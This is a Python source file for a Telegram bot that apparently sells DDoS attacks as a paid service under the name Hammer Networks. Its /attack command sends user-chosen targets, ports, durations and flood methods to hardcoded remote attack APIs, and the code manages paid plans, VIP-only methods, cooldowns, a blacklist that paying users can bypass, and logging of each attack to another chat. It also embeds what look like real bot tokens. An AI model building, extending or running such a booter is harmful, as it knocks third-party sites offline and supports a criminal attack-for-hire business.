from telegram import Update, InlineKeyboardMarkup, InlineKeyboardButton
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes, CallbackQueryHandler, CallbackContext
from uuid import uuid4
import json
from datetime import datetime, timedelta
import asyncio
import aiohttp
from yarl import URL
import httpx
from pytz import timezone
import pytz


BOT_TOKEN = "7357944068:AAGU1xi1Q-iYUuG5iii5uxd3pPcRc9Z9P3Q"
apis = [
    "https://fictional-doodle-gg7j5q57xwqfv65x-3232.app.github.dev/api/attack?key=bixd&host={host}&port={port}&method={method}&time={time}",
    "http://103.238.235.233:9998/api/attack?key=admin&host={host}&port={port}&method={method}&time={time}"
]

vietnam_tz = timezone('Asia/Ho_Chi_Minh')
current_time_vietnam = datetime.now(pytz.utc).astimezone(vietnam_tz)
formatted_date = current_time_vietnam.strftime('%H:%M %d-%m-%Y')


ADMIN_IDS = [6284444968, 6284444968] 
from functions import ban_user, unban_user, blacklist_command,running_command,method_command,list_banned,plan,start,add_user,buy,store,handle_callback,promote_vip_users,handle_ping_command

ALLOWED_CHAT_ID = -1002219907476
def extract_domain(target):
    target = target.replace("http://", "").replace("https://", "")
    parts = target.split("/")
    domain = parts[0]
    return domain

async def get_ip_info(target):
    api_url = f"http://ip-api.com/json/{target}"

    async with httpx.AsyncClient() as client:
        try:
            response = await client.get(api_url)
            response.raise_for_status()
            data = response.json()
            if data["status"] == "success":
                isp = data.get("isp")
                city = data.get("city")
                organization = data.get("org")
                country = data.get("country")
                return isp, city, organization, country
            else:
                return None, None, None, None
        except httpx.HTTPStatusError as e:
            print(f"HTTP error occurred: {e}")
            return None, None, None, None
        except httpx.RequestError as e:
            print(f"Request error occurred: {e}")
            return None, None, None, None

off_bot = False
async def status_method(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_user.id
    if user_id not in ADMIN_IDS:
       return

    global off_bot
    if off_bot == True:
      message = "Bot: Offline"
    else:
       message = "Bot: Online"

    args = context.args
    if not args:
     # await update.message.reply_text("<code>Invalid Command!</code> /status<code> on or off </code>", parse_mode='HTML')
      await update.message.reply_text(message)
      return
    command = args[0].lower()
    if command == 'off':
       off_bot = True
       await update.message.reply_text("Bot: <code>Turn Off</code>", parse_mode='HTML')
    elif command == 'on':
        off_bot = False
        await update.message.reply_text("Bot: <code>Turn On</code>", parse_mode='HTML')
    else:
        await update.message.replit_text('Invalid command')


async def send_to_webhook(user_id, full_name, url, time, port, method, formatted_date, running_attacks, conc, isp, city, organization, country):
  bot_token = "6800401227:AAGGUqUJsrUveoJsnIsVRlMhzbCNcFJBNa8"
  chat_id = "-1002179235018" 
  text = (
      f"🚨 Received Request 🚨\n"
      f"UserID: <code>{user_id}</code>\n"
      f"Username: <a href='tg://user?id={user_id}'>{full_name}</a> \n"
      f"Target: <code>{url}</code>\n"
      f"Port: <code>{port}</code>\n"
      f"Time: <code>{time}</code>\n"
      f"Method: <code>{method}</code>\n"
      f"SentTime: <code>{formatted_date}</code>\n"
  )

  url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
  payload = {
      "chat_id": chat_id,
      "text": text,
      "parse_mode": "HTML"
  }

  async with httpx.AsyncClient() as client:
      try:
          response = await client.post(url, json=payload)
          response.raise_for_status()
      except httpx.HTTPStatusError as e:
          print(f"HTTP error occurred: {e}")  
      except httpx.RequestError as e:
          print(f"Request error occurred: {e}") 


async def call_api(target, time, port, method, apis):
    async with aiohttp.ClientSession() as session:
        for api_template in apis:
            api_url = None
            try:
                api_url = api_template.format(host=target, port=port, time=time, method=method)
                async with session.get(api_url) as response:
                    response.raise_for_status()
            except aiohttp.ClientResponseError as e:
                print(f"HTTP error occurred at {api_url}: {e}")
            except aiohttp.ClientError as e:
                print(f"Request error occurred at {api_url}: {e}")
            except Exception as e:
                print(f"An error occurred at {api_url}: {e}")
    return
      


def load_methods():
  with open('methods.json', 'r') as file:
      return json.load(file)

def load_user_plans():
  with open('users.json', 'r') as file:
      return json.load(file)


async def handle_attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_user.id
    user_plans = load_user_plans()
    user_plan = user_plans.get(str(user_id))

    if not user_plan or datetime.now() > datetime.fromisoformat(user_plan['expire']):
        await update.message.reply_text("Your Plan does not exist\nContact <b>@bixd08</b> for buying Plan",parse_mode="HTML")
        return

    if user_plan.get('banned', False):
        await update.message.reply_text("You are banned from using Hammer Networks service")
        return
    global off_bot
    if off_bot == True and user_id not in ADMIN_IDS:
        await update.message.reply_text("The bot has stopped working. Contact me: @bixd08")
        return

    chat_id = update.effective_chat.id
    if chat_id != ALLOWED_CHAT_ID and user_id not in ADMIN_IDS:
        text = "You need to join the group to use the bot !"
        button = [
        [
             InlineKeyboardButton(text="Admin", url="https://t.me/bixd08"),
             InlineKeyboardButton(text="Channel Main", url="https://t.me/hammer_network")
       ]
     ]
        markup = InlineKeyboardMarkup(button)
        await update.message.reply_text(text, reply_markup=markup)
        return
    args = context.args
    if len(args) != 4:
        await update.message.reply_text("Usage: /attack [target] [port] [time] [method]\nE.g: <code> /attack http://example.com/ 80 60 HTTP-FLOOD</code>",parse_mode="HTML")
        return

    target, port, time, method_name = args
    try:
        time = int(time)
        port = int(port)
    except ValueError:
        await update.message.reply_text("'time' and 'port' values must be numbers.")
        return

    if time > user_plan['time']:
        await update.message.reply_text(f"Your Plan: <b>{user_plan['time']}s</b>",parse_mode="HTML")
        return

    if port > 65535 and port < 1:
        await update.message.reply_text(f"Error Port, Port Must Be Between 1 And 65535",parse_mode="HTML")
        return

    running_attacks_count = count_running_attacks(user_id)
    conc = user_plan['concurrent']
    if running_attacks_count >= int(conc):
        await update.message.reply_text(f"Your Running: <b>{running_attacks_count}/{conc}</b>",parse_mode="HTML")
        return

    current_time = datetime.utcnow()
    last_attack_time = datetime.fromisoformat(user_plan.get('last_attack')) if user_plan.get('last_attack') else None
    cooldown_period = timedelta(seconds=user_plan['cooldown'])

    if last_attack_time and current_time - last_attack_time < cooldown_period:
        remaining_cooldown = cooldown_period - (current_time - last_attack_time)
        await update.message.reply_text(f"Please wait {remaining_cooldown.total_seconds():.0f} second before performing another attack")
        return

    with open('blacklist.json', 'r') as file:
        blacklist = json.load(file)

    is_vip = user_plan.get('vip', False)
    
    if any(blacklisted in target for blacklisted in blacklist) or target.endswith('.gov') or target.endswith('.edu'):
        if not user_plan.get('bypass_blacklist', False):
            await update.message.reply_text(f"⛔ Attack Failed ⛔\nReason: Target <b>{target}</b> is blacklisted", parse_mode="HTML")
            return
    
    methods = load_methods()
    method = next((m for m in methods if m['name'] == method_name), None)
    if not method:
        await update.message.reply_text("Invalid attack method")
        return

    if method['vip'] and not is_vip:
        await update.message.reply_text(f"Method <b>{method_name}</b> is available only for VIP users", parse_mode="HTML")
        return

    username = update.message.chat.username
    full_name = update.effective_user.full_name
    first_name = update.effective_user.first_name

    attack_id = await start_attack(user_id, target, time, port, method_name)
    check_host_url = f"https://check-host.net/check-http?host={target}"
    button = [
        [
             InlineKeyboardButton(text="Check Resut", url=check_host_url),
             InlineKeyboardButton(text="Channel Main", url="https://t.me/hammer_network")
       ]
    ]
    markup = InlineKeyboardMarkup(button)
    await call_api(target, time, port, method_name, apis)

    user_plans[str(user_id)]['last_attack'] = current_time.isoformat()
    with open('users.json', 'w') as file:
        json.dump(user_plans, file, indent=4)

   # response = requests.get(apis)
    running_attacks = count_running_attacks(user_id)
    isp, city, organization, country = await get_ip_info(extract_domain(target))
    linked_user = '[{first_name}](tg://user?id={user_id})'   
    reply_text = (
        f"🔴 Attack Launched 🔴\n\n"
        f"<code>Attack Details:</code>\n"
        f"Target: {target}\n"
        f"Port: {port}\n"
        f"Time: {time}\n"
        f"Method: {method_name}\n"
        f"SentTime: {formatted_date}\n"
        f"Running: {running_attacks}/{conc}\n\n"
        f"<code>Target Details:</code>\n"
        f"Isp: {isp}\n"
        f"Org: {organization}\n"
        f"Country: {country}\n"
        f"Attack ID: {attack_id}\n"
        f"Server Api: {len(apis)}\n"
#        f"Attack From: <a href='tg://user?id=6284444968'>Bi</a>\n"
        f"Initiated: <a href='tg://user?id={user_id}'>{first_name}</a>"
    )

    await update.message.reply_text(reply_text, parse_mode='HTML', reply_markup=markup)
    await send_to_webhook(user_id, full_name, target, time, port, method_name, formatted_date, running_attacks, conc, isp, city, organization, country)
      

async def start_attack(user_id, url, time, port, method_name):
    with open('running.json', 'r+') as file:
        try:
            running_attacks = json.load(file)
        except json.JSONDecodeError:
            running_attacks = {}

        end_time = datetime.utcnow() + timedelta(seconds=int(time))
        attack_id = str(uuid4())

        running_attacks[attack_id] = {
            "user_id": user_id,
            "url": url,
            "time": time,
            "port": port,
            "method_name": method_name,
            "end_time": end_time.isoformat(),
            "formatted_date": formatted_date,
            "attack_id": attack_id
        }

        file.seek(0)
        json.dump(running_attacks, file, indent=4)
        file.truncate()

    asyncio.create_task(end_attack(attack_id, time))

    return attack_id

async def end_attack(attack_id, delay):
  await asyncio.sleep(int(delay))
  with open('running.json', 'r+') as file:
      running_attacks = json.load(file)
      if attack_id in running_attacks:
          del running_attacks[attack_id]

      file.seek(0)
      json.dump(running_attacks, file, indent=4)
      file.truncate()


def count_running_attacks(user_id):
  with open('running.json', 'r') as file:
      try:
          running_attacks = json.load(file)
      except json.JSONDecodeError:
          return 0  

      current_time = datetime.utcnow()
      count = 0
      for attack in running_attacks.values():
          if attack['user_id'] == user_id and datetime.fromisoformat(attack['end_time']) > current_time:
              count += 1

      return count
      



app = ApplicationBuilder().token(BOT_TOKEN).build()


app.add_handler(CommandHandler("attack", handle_attack_command))
app.add_handler(CommandHandler("status", status_method))
app.add_handler(CommandHandler("bl", blacklist_command))
app.add_handler(CommandHandler("add", add_user))
app.add_handler(CommandHandler("ban", ban_user))
app.add_handler(CommandHandler("unban", unban_user))
app.add_handler(CommandHandler("running", running_command))
app.add_handler(CommandHandler("method", method_command))
app.add_handler(CommandHandler("listban", list_banned))
app.add_handler(CommandHandler("plan", plan))
app.add_handler(CommandHandler("start", start))
app.add_handler(CommandHandler("buy", buy))
app.add_handler(CommandHandler("store", store))
app.add_handler(CallbackQueryHandler(handle_callback))
app.add_handler(CommandHandler("set", promote_vip_users))
app.add_handler(CommandHandler("ping", handle_ping_command))
print("Bot is launching........!")
app.run_polling()
